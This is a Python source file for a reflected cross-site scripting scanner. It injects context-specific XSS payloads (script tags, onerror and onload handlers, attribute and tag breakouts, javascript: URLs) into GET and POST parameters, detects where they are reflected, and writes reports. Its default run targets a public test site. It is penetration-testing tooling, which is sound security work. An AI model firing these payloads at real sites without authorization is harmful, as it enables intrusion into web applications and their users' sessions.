#!/usr/bin/env python3
"""
Advanced Reflected XSS Scanner

Features:
- Python 3
- Context-aware PayloadGenerator (attribute-name, attribute-value, text-node, script, event, tag-break, url)
- Supports GET and POST (form + JSON body)
- Automatic detection of reflected payloads via unique markers
- HTML parsing via BeautifulSoup to guess reflection context:
    * tag-name
    * attribute-name
    * attribute-value
    * event-handler
    * text-node
    * script
    * json-value (non-HTML JSON responses)
    * raw-body (non-HTML fallback)
- Parallel scanning (ThreadPoolExecutor)
- Custom headers, cookies, optional Bearer auth, HTTP proxy, SSL verification toggle
- Outputs:
    * Terminal report
    * HTML report
    * JSON report (optional)

Use only against targets you are authorized to test.
"""

import argparse
import requests
import random
import string
import html
import json
import re
import time
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional
from urllib.parse import urlparse, urlunparse, urlencode, parse_qsl, quote_plus

from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed


# =========================
# Data Classes
# =========================

@dataclass
class PayloadInstance:
    position: str
    template: str
    marker: str
    payload: str


@dataclass
class ReflectionFinding:
    target_url: str
    method: str
    param: str
    position: str
    injection_mode: str  # "name" or "value"
    marker: str
    payload: str
    status_code: int
    content_type: str
    contexts: List[str] = field(default_factory=list)


# =========================
# Payload Generator
# =========================

class PayloadGenerator:
    """
    Generates payloads depending on injection position.

    - Each payload contains a UNIQUE marker (like XSS_AB12CD) to track it
      even if parts of the payload are modified.
    - Templates use {MARK} placeholder which gets replaced by a unique marker.
    """

    def __init__(self, base_token: Optional[str] = None):
        self.base_token = base_token or self._rand_token()

    @staticmethod
    def _rand_token(length: int = 6) -> str:
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

    def _new_marker(self) -> str:
        return f"XSS_{self.base_token}_{self._rand_token(4)}"

    def _build_instances(self, position: str, templates: List[str]) -> List[PayloadInstance]:
        instances: List[PayloadInstance] = []
        for tpl in templates:
            marker = self._new_marker()
            payload = tpl.replace("{MARK}", marker)
            instances.append(PayloadInstance(position=position, template=tpl, marker=marker, payload=payload))
        return instances

    def generate(self, position: str) -> List[PayloadInstance]:
        """
        Returns a list of PayloadInstance objects for a given injection position.
        Supported positions:
            - attr_name
            - attr_value
            - text
            - script
            - event
            - tag_break
            - url
        """
        pos = position.lower()

        if pos == "attr_name":
            templates = [
                "{MARK}",
                "{MARK}-x",
                "data-{MARK}",
                "onmouseover{MARK}",        # can sometimes create weird event-like names
                "{MARK}=\"1\"",             # tries to inject as full attr-name + value
            ]
        elif pos == "attr_value":
            templates = [
                "{MARK}",
                "\"{MARK}\"",
                "'{MARK}'",
                "{MARK}\" onmouseover=\"alert(1)\"",
                "{MARK}><script>alert('{MARK}')</script>",
            ]
        elif pos == "text":
            templates = [
                "{MARK}",
                "<img src=x onerror=alert('{MARK}')>",
                "<svg/onload=alert('{MARK}')>",
                "</script><script>console.log('{MARK}')</script>",
            ]
        elif pos == "script":
            templates = [
                "console.log('{MARK}');",
                "');alert('{MARK}');//",
                "\");/*{MARK}*/",
                "var x='{MARK}';",
            ]
        elif pos == "event":
            templates = [
                "alert('{MARK}')",
                "console.log('{MARK}')",
                "confirm('{MARK}')",
            ]
        elif pos == "tag_break":
            templates = [
                "\"><script>alert('{MARK}')</script>",
                "'><img src=1 onerror=console.log('{MARK}')>",
                "></textarea><script>console.log('{MARK}')</script>",
            ]
        elif pos == "url":
            templates = [
                "javascript:alert('{MARK}')",
                "https://example.com/?q={MARK}",
            ]
        else:
            # Fallback: general detection
            templates = [
                "{MARK}",
                "<script>console.log('{MARK}')</script>",
            ]

        return self._build_instances(pos, templates)


# =========================
# XSS Scanner
# =========================

class XSSScanner:
    def __init__(
        self,
        base_url: str,
        params: List[str],
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
        json_body: bool = False,
        max_workers: int = 10,
        timeout: int = 10,
        verify_ssl: bool = True,
        delay: float = 0.0,
        payload_generator: Optional[PayloadGenerator] = None,
        proxy: Optional[str] = None,
        verbose: bool = True,
    ):
        self.base_url = base_url
        self.params = params
        self.method = method.upper()
        self.json_body = json_body
        self.max_workers = max_workers
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.delay = delay
        self.verbose = verbose

        self.payload_generator = payload_generator or PayloadGenerator()
        self.findings: List[ReflectionFinding] = []

        self.session = requests.Session()
        if headers:
            self.session.headers.update(headers)
        if cookies:
            self.session.cookies.update(cookies)
        if proxy:
            self.session.proxies.update({
                "http": proxy,
                "https": proxy
            })

    # ---------- HTTP helpers ----------

    def _build_get(self, inject_param: str, inject_as_name: bool, payload: str) -> str:
        parsed = urlparse(self.base_url)
        query_pairs = parse_qsl(parsed.query, keep_blank_values=True)
        q = dict(query_pairs)

        if inject_as_name:
            # remove original param, inject payload as parameter name
            q = {k: v for k, v in q.items() if k != inject_param}
            q[payload] = "1"
        else:
            q[inject_param] = payload

        new_query = urlencode(q, doseq=True, quote_via=quote_plus)
        new_parsed = parsed._replace(query=new_query)
        return urlunparse(new_parsed)

    def _build_post(self, inject_param: str, inject_as_name: bool, payload: str):
        if self.json_body:
            body: Dict[str, str] = {}
            if inject_as_name:
                body[payload] = "1"
            else:
                body[inject_param] = payload
            return body
        else:
            data: Dict[str, str] = {}
            if inject_as_name:
                data[payload] = "1"
            else:
                data[inject_param] = payload
            return data

    def _send_request(self, url: str, method: str, data=None) -> Optional[requests.Response]:
        try:
            if method.upper() == "GET":
                resp = self.session.get(
                    url,
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                    allow_redirects=True,
                )
            else:
                if self.json_body:
                    resp = self.session.post(
                        url,
                        json=data,
                        timeout=self.timeout,
                        verify=self.verify_ssl,
                        allow_redirects=True,
                    )
                else:
                    resp = self.session.post(
                        url,
                        data=data,
                        timeout=self.timeout,
                        verify=self.verify_ssl,
                        allow_redirects=True,
                    )
            return resp
        except Exception as e:
            if self.verbose:
                print(f"[!] Request error to {url}: {e}")
            return None

    # ---------- Context Detection ----------

    def detect_contexts(self, response_text: str, marker: str, content_type: str) -> List[str]:
        """
        Try to guess where XSS marker is reflected.
        """
        contexts = set()

        if not response_text or marker not in response_text:
            return []

        content_type_lower = (content_type or "").lower()

        # HTML contexts
        if "html" in content_type_lower:
            soup = BeautifulSoup(response_text, "html.parser")

            # script content
            for script in soup.find_all("script"):
                if marker in script.get_text():
                    contexts.add("script")

            # tags and attributes
            for tag in soup.find_all(True):
                # tag-name
                if marker in (tag.name or ""):
                    contexts.add("tag-name")

                # attributes
                for attr_name, attr_val in list(tag.attrs.items()):
                    if marker in attr_name:
                        contexts.add("attribute-name")

                    if isinstance(attr_val, list):
                        value_str = " ".join(str(v) for v in attr_val)
                    else:
                        value_str = str(attr_val)

                    if marker in value_str:
                        if attr_name.lower().startswith("on"):
                            contexts.add("event-handler")
                        else:
                            contexts.add("attribute-value")

            # text nodes
            for text_node in soup.find_all(string=True):
                if marker in text_node:
                    contexts.add("text-node")

        # Non-HTML: JSON or raw
        else:
            if "json" in content_type_lower:
                contexts.add("json-value")
            else:
                contexts.add("raw-body")

        if not contexts:
            contexts.add("unknown")

        return sorted(contexts)

    # ---------- Single Test ----------

    def _run_single_test(
        self,
        param: str,
        position: str,
        payload_instance: PayloadInstance,
        inject_as_name: bool
    ) -> Optional[ReflectionFinding]:
        marker = payload_instance.marker
        payload = payload_instance.payload

        # Build request
        if self.method == "GET":
            url = self._build_get(param, inject_as_name=inject_as_name, payload=payload)
            resp = self._send_request(url, "GET")
        else:
            url = self.base_url
            post_body = self._build_post(param, inject_as_name=inject_as_name, payload=payload)
            resp = self._send_request(url, "POST", data=post_body)

        if not resp or resp.text is None:
            return None

        response_text = resp.text
        content_type = resp.headers.get("Content-Type", "")

        # Check reflection by marker
        if marker not in response_text:
            return None

        contexts = self.detect_contexts(response_text, marker, content_type)

        return ReflectionFinding(
            target_url=url,
            method=self.method,
            param=param,
            position=position,
            injection_mode="name" if inject_as_name else "value",
            marker=marker,
            payload=payload,
            status_code=resp.status_code,
            content_type=content_type,
            contexts=contexts,
        )

    # ---------- Main Scan ----------

    def scan(self, positions: Optional[List[str]] = None) -> List[ReflectionFinding]:
        """
        positions: list of positions to test, e.g.
            ["attr_name", "attr_value", "text", "script", "event", "tag_break"]
        """
        if positions is None:
            positions = ["attr_name", "attr_value", "text", "script", "event", "tag_break"]

        tasks = []
        if self.verbose:
            print(f"[+] Starting scan: {self.base_url}")
            print(f"    Method: {self.method}, Params: {self.params}, Positions: {positions}")

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []

            for param in self.params:
                for position in positions:
                    payloads = self.payload_generator.generate(position)
                    inject_as_name = (position.lower() == "attr_name")
                    for p_instance in payloads:
                        futures.append(
                            executor.submit(
                                self._run_single_test,
                                param,
                                position,
                                p_instance,
                                inject_as_name
                            )
                        )

            if self.verbose:
                print(f"[+] Dispatched {len(futures)} payload tests with {self.max_workers} workers...")

            for fut in as_completed(futures):
                try:
                    res = fut.result()
                except Exception as e:
                    if self.verbose:
                        print(f"[!] Worker error: {e}")
                    res = None

                if res:
                    self.findings.append(res)
                    if self.verbose:
                        print(f"[+] Reflection found: "
                              f"param={res.param} position={res.position} mode={res.injection_mode} "
                              f"marker={res.marker} contexts={','.join(res.contexts)}")

                if self.delay > 0:
                    time.sleep(self.delay)

        return self.findings

    # ---------- Reports ----------

    def report_terminal(self):
        print("\n=== Reflected XSS Scan Report ===")
        print(f"Target: {self.base_url}")
        print(f"Total reflections found: {len(self.findings)}")

        if not self.findings:
            print("[*] No reflections detected.")
            return

        for f in self.findings:
            print("-" * 60)
            print(f"URL         : {f.target_url}")
            print(f"Method      : {f.method}")
            print(f"Param       : {f.param}")
            print(f"Position    : {f.position}")
            print(f"Injection   : {f.injection_mode}")
            print(f"Status Code : {f.status_code}")
            print(f"Content-Type: {f.content_type}")
            print(f"Marker      : {f.marker}")
            print(f"Payload     : {f.payload}")
            print(f"Contexts    : {', '.join(f.contexts)}")

    def report_html(self, filename: str = "xss_report.html"):
        parts: List[str] = []
        parts.append("<!DOCTYPE html>")
        parts.append("<html><head><meta charset='utf-8'><title>XSS Scan Report</title>")
        parts.append("""
<style>
body { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; padding: 20px; }
h1, h2 { font-weight: 600; }
table { border-collapse: collapse; width: 100%; margin-top: 10px; }
th, td { border: 1px solid #ddd; padding: 8px; font-size: 13px; vertical-align: top; }
th { background: #f5f5f5; text-align: left; }
pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
.badge { display: inline-block; padding: 2px 6px; border-radius: 4px; background: #eee; margin-right: 4px; }
.badge-danger { background: #f8d7da; }
.badge-warn { background: #fff3cd; }
.badge-info { background: #d1ecf1; }
</style></head><body>
        """)
        parts.append(f"<h1>Reflected XSS Scan Report</h1>")
        parts.append(f"<p><b>Target:</b> {html.escape(self.base_url)}</p>")
        parts.append(f"<p><b>Total reflections found:</b> {len(self.findings)}</p>")

        if not self.findings:
            parts.append("<p><b>No reflections detected.</b></p></body></html>")
        else:
            parts.append("<table>")
            parts.append("<tr><th>#</th><th>URL</th><th>Method</th><th>Param</th>"
                         "<th>Position</th><th>Injection</th><th>Status</th>"
                         "<th>Contexts</th><th>Payload</th></tr>")

            for idx, f in enumerate(self.findings, start=1):
                ctx_badges = " ".join(
                    f"<span class='badge badge-info'>{html.escape(c)}</span>" for c in f.contexts
                )

                parts.append("<tr>")
                parts.append(f"<td>{idx}</td>")
                parts.append(f"<td><pre>{html.escape(f.target_url)}</pre></td>")
                parts.append(f"<td>{html.escape(f.method)}</td>")
                parts.append(f"<td>{html.escape(f.param)}</td>")
                parts.append(f"<td>{html.escape(f.position)}</td>")
                parts.append(f"<td>{html.escape(f.injection_mode)}</td>")
                parts.append(f"<td>{f.status_code}</td>")
                parts.append(f"<td>{ctx_badges}</td>")
                parts.append(f"<td><pre>{html.escape(f.payload)}</pre></td>")
                parts.append("</tr>")

            parts.append("</table></body></html>")

        with open(filename, "w", encoding="utf-8") as f:
            f.write("\n".join(parts))

        if self.verbose:
            print(f"[+] HTML report written to {filename}")

    def report_json(self, filename: str = "xss_report.json"):
        data = [asdict(f) for f in self.findings]
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
        if self.verbose:
            print(f"[+] JSON report written to {filename}")


# =========================
# CLI
# =========================

def parse_kv_list(s: Optional[str]) -> Dict[str, str]:
    """
    Parse "k:v,k2:v2" into dict.
    """
    result: Dict[str, str] = {}
    if not s:
        return result
    for part in s.split(","):
        part = part.strip()
        if not part:
            continue
        if ":" in part:
            k, v = part.split(":", 1)
            result[k.strip()] = v.strip()
    return result


def main():
    parser = argparse.ArgumentParser(
        description="Advanced Reflected XSS scanner. Use only on targets you are allowed to test."
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., https://host/path).")
    parser.add_argument(
        "-p", "--params", required=True,
        help="Comma-separated parameter names to test (e.g., q,search,category)."
    )
    parser.add_argument(
        "-X", "--method", choices=["GET", "POST"], default="GET",
        help="HTTP method to use."
    )
    parser.add_argument(
        "--json-body", action="store_true",
        help="Send POST body as JSON instead of form-encoded (only for POST)."
    )
    parser.add_argument(
        "--headers",
        help='Custom headers as "Key:Value,Another-Header:Something".'
    )
    parser.add_argument(
        "--cookies",
        help='Custom cookies as "name:value,session:abcd123".'
    )
    parser.add_argument(
        "--auth-bearer",
        help="Bearer token for Authorization header (overrides any existing Authorization header)."
    )
    parser.add_argument(
        "--proxy",
        help="HTTP proxy, e.g. http://127.0.0.1:8080 (also used for HTTPS)."
    )
    parser.add_argument(
        "--threads", type=int, default=10,
        help="Max parallel worker threads."
    )
    parser.add_argument(
        "--timeout", type=int, default=10,
        help="HTTP timeout in seconds."
    )
    parser.add_argument(
        "--delay", type=float, default=0.0,
        help="Optional delay (in seconds) between completed requests."
    )
    parser.add_argument(
        "--no-verify-ssl", action="store_true",
        help="Disable SSL certificate verification."
    )
    parser.add_argument(
        "--positions",
        help="Comma-separated positions to test "
             "(attr_name,attr_value,text,script,event,tag_break,url)."
    )
    parser.add_argument(
        "--html-report", default="xss_report.html",
        help="HTML report output filename (default: xss_report.html)."
    )
    parser.add_argument(
        "--json-report",
        help="Optional JSON report filename (if not provided, JSON report is skipped)."
    )
    parser.add_argument(
        "--quiet", action="store_true",
        help="Less verbose output."
    )

    # Provide dummy arguments for Colab execution
    args_list = [
        "-u", "http://testphp.vulnweb.com/", # Placeholder URL
        "-p", "id,name" # Placeholder parameters (comma-separated names)
    ]
    args = parser.parse_args(args_list)

    headers = parse_kv_list(args.headers)
    cookies = parse_kv_list(args.cookies)

    # Apply Bearer auth if given
    if args.auth_bearer:
        headers["Authorization"] = f"Bearer {args.auth_bearer}"

    param_list = [p.strip() for p in args.params.split(",") if p.strip()]
    if not param_list:
        print("[!] No valid parameters provided.")
        return

    positions = None
    if args.positions:
        positions = [x.strip() for x in args.positions.split(",") if x.strip()]

    scanner = XSSScanner(
        base_url=args.url,
        params=param_list,
        method=args.method,
        headers=headers,
        cookies=cookies,
        json_body=args.json_body,
        max_workers=args.threads,
        timeout=args.timeout,
        verify_ssl=not args.no_verify_ssl,
        delay=args.delay,
        payload_generator=PayloadGenerator(),
        proxy=args.proxy,
        verbose=not args.quiet,
    )

    scanner.scan(positions=positions)
    scanner.report_terminal()
    scanner.report_html(args.html_report)

    if args.json_report:
        scanner.report_json(args.json_report)


if __name__ == "__main__":
    main()